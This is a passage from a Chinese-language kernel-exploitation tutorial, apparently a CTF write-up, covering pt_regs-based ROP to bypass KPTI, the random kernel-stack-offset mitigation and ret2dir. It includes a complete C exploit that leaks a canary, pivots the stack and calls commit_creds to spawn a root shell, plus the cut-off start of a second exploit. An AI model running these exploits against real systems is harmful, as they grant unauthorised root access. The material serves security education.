class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>内核栈只有一个页面的大小，而 <code>pt_regs</code> 结构体则固定位于内核栈栈底，当我们劫持内核结构体中的某个函数指针时（例如 <code>seq_operations-&gt;start</code>），在我们通过该函数指针劫持内核执行流时 <code>rsp</code> 与 栈底的相对偏移通常是不变的。</p>
<p>而在系统调用当中过程有很多的寄存器其实是不一定能用上的，比如 <code>r8 ~ r15</code>，这些寄存器为我们布置 ROP 链提供了可能，我们不难想到：只需要寻找到一条形如 <code>&quot;add rsp, val ; ret&quot;</code> 的<code>gadget</code>便能够完成<code>ROP</code>，在进入内核态前像寄存器写入一些值，看那些寄存器可以被保留，以便后续写入<code>gadget</code>。</p>
<blockquote>
<p>KPTI pass：使用 <code>seq_operations + pt_regs</code></p>
<p>结构体 <code>seq_operations</code> 的条目如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">struct seq_operations &#123;</span><br><span class="line">    void * (*start) (struct seq_file *m, loff_t *pos);</span><br><span class="line">    void (*stop) (struct seq_file *m, void *v);</span><br><span class="line">    void * (*next) (struct seq_file *m, void *v, loff_t *pos);</span><br><span class="line">    int (*show) (struct seq_file *m, void *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>当我们打开一个 stat 文件时（如 <code>/proc/self/stat</code>）便会在内核空间中分配一个 <code>seq_operations</code> 结构体 </li>
<li>当我们 read 一个 stat 文件时，内核会调用其 <code>proc_ops</code> 的 <code>proc_read_iter</code> 指针，然后调用 <code>seq_operations-&gt;start</code> 函数指针</li>
</ul>
</blockquote>
<h3 id="利用思路-4"><a href="#利用思路-4" class="headerlink" title="利用思路"></a>利用思路</h3><p>这次我们限制溢出只能覆盖返回地址，此时需要栈迁移到其他地方构造 rop 。其中一个思路就是在 <code>pt_regs</code> 上构造 rop 。我们在调用 <code>core_copy_func</code> 函数之前先将寄存器设置为几个特殊的值，然后再 <code>core_copy_func</code> 函数的返回处下断点。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, 0x1111111111111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, 0x2222222222222222;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, 0x3333333333333333;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, 0x4444444444444444;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp, 0x5555555555555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx, 0x6666666666666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x7777777777777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, 0x8888888888888888;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9, 0x9999999999999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8, 0xaaaaaaaaaaaaaaaa;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx, 0xbbbbbbbbbbbbbbbb;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rax, 0x10;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 0xffffffffffff0050;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, 0x6677889A;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, core_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">        );</span><br></pre></td></tr></table></figure></div>

<p>数字没变的寄存器就是我们能够控制的。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0b:0058│     0xffffc90000113f58 ◂— 0x1111111111111111</span><br><span class="line">0c:0060│     0xffffc90000113f60 ◂— 0x2222222222222222 (<span class="string">&#x27;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&#x27;</span>)</span><br><span class="line">0d:0068│     0xffffc90000113f68 ◂— 0x3333333333333333 (<span class="string">&#x27;33333333&#x27;</span>)</span><br><span class="line">0e:0070│     0xffffc90000113f70 ◂— 0x4444444444444444 (<span class="string">&#x27;DDDDDDDD&#x27;</span>)</span><br><span class="line">0f:0078│     0xffffc90000113f78 ◂— 0x5555555555555555 (<span class="string">&#x27;UUUUUUUU&#x27;</span>)</span><br><span class="line">10:0080│     0xffffc90000113f80 ◂— 0x6666666666666666 (<span class="string">&#x27;ffffffff&#x27;</span>)</span><br><span class="line">11:0088│     0xffffc90000113f88 ◂— 0x207</span><br><span class="line">12:0090│     0xffffc90000113f90 ◂— 0x8888888888888888</span><br><span class="line">13:0098│     0xffffc90000113f98 ◂— 0x9999999999999999</span><br><span class="line">14:00a0│     0xffffc90000113fa0 ◂— 0xaaaaaaaaaaaaaaaa</span><br><span class="line">15:00a8│     0xffffc90000113fa8 ◂— 0xffffffffffffffda</span><br><span class="line">16:00b0│     0xffffc90000113fb0 —▸ 0x401566 ◂— lea rax, [rip + 0xbb44]</span><br><span class="line">17:00b8│     0xffffc90000113fb8 ◂— 0xffffffffffff0050 /* <span class="string">&#x27;P&#x27;</span> */</span><br><span class="line">18:00c0│     0xffffc90000113fc0 ◂— 0x6677889a</span><br><span class="line">19:00c8│     0xffffc90000113fc8 ◂— 0x614d8e5400000004</span><br><span class="line">1a:00d0│     0xffffc90000113fd0 ◂— 0x10</span><br><span class="line">1b:00d8│     0xffffc90000113fd8 —▸ 0x401566 ◂— lea rax, [rip + 0xbb44]</span><br><span class="line">1c:00e0│     0xffffc90000113fe0 ◂— 0x33 /* <span class="string">&#x27;3&#x27;</span> */</span><br><span class="line">1d:00e8│     0xffffc90000113fe8 ◂— 0x207</span><br><span class="line">1e:00f0│     0xffffc90000113ff0 —▸ 0x7ffe1d48e620 ◂— 0x0</span><br><span class="line">1f:00f8│     0xffffc90000113ff8 ◂— 0x2b /* <span class="string">&#x27;+&#x27;</span> */</span><br></pre></td></tr></table></figure></div>

<h3 id="新版本内核对抗利用-pt-regs-进行攻击的办法"><a href="#新版本内核对抗利用-pt-regs-进行攻击的办法" class="headerlink" title="新版本内核对抗利用 pt_regs 进行攻击的办法"></a>新版本内核对抗利用 pt_regs 进行攻击的办法</h3><p>正所谓魔高一尺道高一丈，内核主线在 <a class="link"   target="_blank" rel="noopener" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=eea2647e74cd7bd5d04861ce55fa502de165de14" >这个 commit<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 中为系统调用栈添加了一个偏移值，这意味着 <code>pt_regs</code> 与我们触发劫持内核执行流时的栈间偏移值不再是固定值：</p>
<div class="code-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/arch/x86/entry/common.c b/arch/x86/entry/common.c</span></span><br><span class="line"><span class="comment">index 4efd39aacb9f2..7b2542b13ebd9 100644</span></span><br><span class="line"><span class="comment">--- a/arch/x86/entry/common.c</span></span><br><span class="line"><span class="comment">+++ b/arch/x86/entry/common.c</span></span><br><span class="line"><span class="meta">@@ -38,6 +38,7 @@</span></span><br><span class="line"> #ifdef CONFIG_X86_64</span><br><span class="line"> __visible noinstr void do_syscall_64(unsigned long nr, struct pt_regs *regs)</span><br><span class="line"> &#123;</span><br><span class="line"><span class="addition">+    add_random_kstack_offset();</span></span><br><span class="line">     nr = syscall_enter_from_user_mode(regs, nr);</span><br><span class="line"></span><br><span class="line">     instrumentation_begin();</span><br></pre></td></tr></table></figure></div>

<p>当然，若是在这个随机偏移值较小且我们仍有足够多的寄存器可用的情况下，仍然可以通过布置一些 <code>slide gadget</code> 来继续完成利用，不过稳定性也大幅下降了。</p>
<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xFFFFFFFF8109CCE0</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xFFFFFFFF8109C8E0</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFFF8223D1A0</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff81000b2f</span>;</span><br><span class="line"><span class="type">size_t</span> add_rsp_0xe8_ret = <span class="number">0xffffffff816bb966</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xFFFFFFFF81A008DA</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> core_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">size_t</span> off)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889C</span>, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_write</span><span class="params">(<span class="type">char</span> *buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    write(core_fd, buf, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rebase</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open kallsyms.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(kallsyms_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, name)) &#123;</span><br><span class="line">        <span class="type">size_t</span> offset = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;commit_creds&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) commit_creds;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) prepare_kernel_cred;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (offset != <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] offset: %p\n&quot;</span>, offset);</span><br><span class="line">            commit_creds += offset;</span><br><span class="line">            prepare_kernel_cred += offset;</span><br><span class="line">            init_cred += offset;</span><br><span class="line">            pop_rdi_ret += offset;</span><br><span class="line">            add_rsp_0xe8_ret += offset;</span><br><span class="line">            swapgs_restore_regs_and_return_to_usermode += offset;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] commit_creds: %p\n&quot;</span>, (<span class="type">size_t</span>) commit_creds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] prepare_kernel_cred: %p\n&quot;</span>, (<span class="type">size_t</span>) prepare_kernel_cred);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">get_canary</span><span class="params">()</span> &#123;</span><br><span class="line">    set_off(<span class="number">64</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    core_read(buf);</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">size_t</span> *) buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    rebase();</span><br><span class="line"></span><br><span class="line">    core_fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (core_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open core.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> canary = get_canary();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    *(<span class="type">size_t</span> *) &amp;buf[<span class="number">64</span>] = canary;</span><br><span class="line">    *(<span class="type">size_t</span> *) &amp;buf[<span class="number">80</span>] = add_rsp_0xe8_ret;</span><br><span class="line"></span><br><span class="line">    core_write(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 由于这里用的是正常的 trap_frame 因此不需要 save_status 和伪造 trap_frame 。</span></span><br><span class="line"><span class="comment">    * 另外，前四个寄存器被我们布置gadget，所以从+8位置开始执行即可。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    __asm__(</span><br><span class="line">            <span class="string">&quot;mov r15, pop_rdi_ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r14, init_cred;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r13, commit_creds;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r12, swapgs_restore_regs_and_return_to_usermode+0x8;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbp, 0x5555555555555555;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbx, 0x6666666666666666;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, 0x7777777777777777;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r10, 0x8888888888888888;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r9, 0x9999999999999999;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r8, 0xaaaaaaaaaaaaaaaa;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rax, 0x10;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdx, 0xffffffffffff0058;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rsi, 0x6677889A;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdi, core_fd;&quot;</span></span><br><span class="line">            <span class="string">&quot;syscall&quot;</span></span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>执行 <code>add_rsp_0xc8_pop*4_ret</code> 时栈布局，rsp抬高<code>0xc8+0x20</code>后 ret 会执行到我们的 <code>shellcode</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20240905115129293.png"
                      alt="image-20240905115129293"
                ></p>
<h2 id="ret2dir"><a href="#ret2dir" class="headerlink" title="ret2dir"></a>ret2dir</h2><p>如果 <code>ptregs</code> 所在的内存被修改了导致最多只能控制 16 字节的内存我们可以利用 ret2dir 的利用方式将栈迁移至内核的线性映射区。不同版本内核的线性映射区可以从内核源码文档的<a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.15.8/source/Documentation/x86/x86_64/mm.txt" >mm.txt<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>查看。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20240906090938018.png"
                      alt="image-20240906090938018"
                ></p>
<p>ret2dir 是哥伦比亚大学网络安全实验室在 2014 年提出的一种辅助攻击手法，主要用来绕过 smep、smap、pxn 等用户空间与内核空间隔离的防护手段，<a class="link"   target="_blank" rel="noopener" href="http://www.cs.columbia.edu/~vpk/papers/ret2dir.sec14.pdf" >原论文<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。<br> linux 系统有一部分物理内存区域同时映射到用户空间和内核空间的某个物理内存地址。一块区域叫做 direct mapping area，即内核的线性映射区。，这个区域映射了所有的物理内存。我们在用户空间中布置的 gadget 可以通过 direct mapping area 上的地址在内核空间中访问到。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20240410172028837.png"
                      alt="image-20240410172028837"
                ></p>
<p>但需要注意的是在新版的内核当中 direct mapping area 已经不再具有可执行权限，因此我们很难再在用户空间直接布置 shellcode 进行利用，但我们仍能通过在用户空间布置 ROP 链的方式完成利用。</p>
<h3 id="利用思路-5"><a href="#利用思路-5" class="headerlink" title="利用思路"></a>利用思路</h3><p>这题主要思路如下：</p>
<ol>
<li><p>使用 mmap 喷射大量内存，并在里面写上rop链。</p>
</li>
<li><p>将try_hit的地址传给rbp，再利用<code>leave;ret</code>进行栈迁移。</p>
</li>
<li><p>完成栈迁移，执行提权代码。</p>
</li>
</ol>
<p>返回用户空间在使用 <code>swapgs_restore_regs_and_return_to_usermode</code>  函数时应该注意，前面 pop 完寄存器之后除 iretq 需要的寄存器还剩 orig_rax 和 rdi ，为了缩短 rop 的长度，可以直接  retn 到 <code>swapgs_restore_regs_and_return_to_usermode + 27;</code>，不过 rop 接下来还要有 16 字节的填充来表示 orig_rax 和 rdi 的位置。</p>
<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span 